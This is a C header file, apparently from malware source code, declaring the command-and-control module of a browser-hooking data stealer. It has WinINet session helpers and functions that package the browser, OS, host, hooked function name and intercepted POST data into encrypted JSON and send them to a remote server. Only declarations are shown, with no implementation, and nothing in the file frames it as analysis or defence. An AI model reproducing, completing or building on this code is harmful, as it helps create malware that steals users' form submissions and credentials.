#ifndef COMMANDCONTROL_H_
#define COMMANDCONTROL_H_

#define MAX_CONTENT_LENGTH 150000
#define MAX_QUERY_CONTENT_LENGTH 16

typedef struct 
{
	HINTERNET pvInternet;
	HINTERNET pvSession;
	HINTERNET pvRequest;
}INTERNET_SESSION;

unsigned long GetRequestContentLength(INTERNET_SESSION* IS);
INTERNET_SESSION* GetInternetSession(char* server,INTERNET_PORT port);
int CreateRequest(INTERNET_SESSION* IS,char* requestType,char* requestPage,char* headers,void* requestData,unsigned long dataLength );
int ReadRequestContent(INTERNET_SESSION* IS,unsigned char* recbuf,unsigned long* recbuflength);
void CleanSession(INTERNET_SESSION** PIS);
void CleanRequest(INTERNET_SESSION* PIS);

int CreateJSONRequestWrapper(char* Browser, DWORD dwBrowser, char* OS, DWORD dwOS, char* Host, DWORD dwHost, char * Hooked, DWORD dwHooked, char* PostData, DWORD dwPostData, unsigned char** ucJSONDestination);
int SendJSONRequest(char* JSONRequest, DWORD dwJSONRequest, char* szHost, char* szPage, char* szMethod, unsigned char* ucKey, DWORD dwKey);
void SendPOSTRequest(char* Browser, char* ContentHost, DWORD dwContentHost, char* HookedFunction, DWORD dwHookedFunction, char* PostData, DWORD dwPostData );

#endif
